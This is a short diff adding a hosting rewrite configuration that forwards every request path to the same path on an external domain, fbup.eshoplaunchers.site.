@@ -1,0 +1,5 @@
+{
+  "rewrites": [
+    { "source": "/(.*)", "destination": "https://fbup.eshoplaunchers.site/$1" }
+  ]
+}
